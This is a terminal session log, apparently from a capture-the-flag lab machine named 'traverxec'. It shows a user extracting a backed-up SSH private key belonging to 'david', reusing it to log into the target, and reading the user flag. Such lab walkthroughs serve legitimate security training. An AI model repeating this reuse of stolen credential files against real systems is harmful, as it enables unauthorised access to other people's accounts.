**********@debian:~/Desktop$ ls
10.10.10.3                     exploitReference.txt  Prog8.jar
advent_of_cod                  hw02-starter          Prog8RE.java
backup-ssh-identity-files.tgz  msfinstall            pwn3yb0i.ovpn
bad_calculator_calc.png        network.desktop       stupid_calculator
bad_calculator_main.png        nmap_scan.gnmap       Tint
bad_calculator.png             nmap_scan.nmap        traffic.dump
computer.desktop               nmap_scan.xml         trash-can.desktop
EthicalHack                    prod.dtsConfig        user-home.desktop
**********@debian:~/Desktop$ tar -xvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
**********@debian:~/Desktop$ cd home
**********@debian:~/Desktop/home$ ls
david
**********@debian:~/Desktop/home$ cd davic
bash: cd: davic: No such file or directory
**********@debian:~/Desktop/home$ cd david
**********@debian:~/Desktop/home/david$ ls                              
**********@debian:~/Desktop/home/david$ ls -a                           
.  ..  .ssh                                                             
**********@debian:~/Desktop/home/david$ cd .ssh                         
**********@debian:~/Desktop/home/david/.ssh$ ls                         
authorized_keys  id_rsa  id_rsa.pub                                     
**********@debian:~/Desktop/home/david/.ssh$ cp id_rsa /home/**********/david.pen                                                               
**********@debian:~/Desktop/home/david/.ssh$ cd $home                   
**********@debian:~$ ls                                                 
david.pen  Documents  Music     Public     Videos                       
Desktop    Downloads  Pictures  Templates
**********@debian:~$ chmod 600 david.pen
**********@debian:~$ ssh -i david.pen david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'david.pen': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ ls -al
total 36
drwx--x--x 5 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 root  root  4096 Oct 25 14:32 ..
lrwxrwxrwx 1 root  root     9 Oct 25 16:15 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25 14:32 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25 14:32 .bashrc
drwx------ 2 david david 4096 Oct 25 16:26 bin
-rw-r--r-- 1 david david  807 Oct 25 14:32 .profile
drwxr-xr-x 3 david david 4096 Oct 25 15:45 public_www
drwx------ 2 david david 4096 Oct 25 17:02 .ssh
-r--r----- 1 root  david   33 Oct 25 16:14 user.txt
david@traverxec:~$ cat user.txt
*******************************
